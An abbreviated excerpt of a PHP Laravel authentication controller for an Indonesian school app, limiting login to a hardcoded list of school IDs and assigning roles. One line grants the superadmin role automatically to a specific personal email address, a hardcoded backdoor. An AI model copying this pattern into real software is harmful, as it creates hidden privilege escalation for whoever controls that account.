...
class AuthController extends Controller
{
    ...
    {
        $npsn = ['70009413', '20537428', '20552093', '20552090', '20566552'];
        if(!in_array(request()->username, $npsn)){
            return response()->json([
                'errors'=> [
                    'username' => ['NPSN tidak terdaftar untuk menggunakan aplikasi ini!'],
                ],
            ]);
        }
        $request->validate(
    ...
    private function loggedUser($user){
        ...
        if($user->sekolah_id && !$user->peserta_didik_id && !$user->guru_id){
            ...
            if($user->email == 'masadi.com@gmail.com'){//
                if(!$user->hasRole('superadmin', $semester->nama)){
                    $user->attachRole('superadmin', $team);
                }
            }
        }
        if($user->hasRole('admin', $semester->nama)){
            ...
            if($user->hasRole('wali', $semester->nama)){
                if($semester->semester == 1){
                    ...
                    $find = Rombongan_belajar::where(function($query) use ($user){
                        $query->whereIn('tingkat', [6,9,12]);
    ...
    private function create_user($data, $email, $password){
        ...
        if($set_data->bentuk_pendidikan_id){
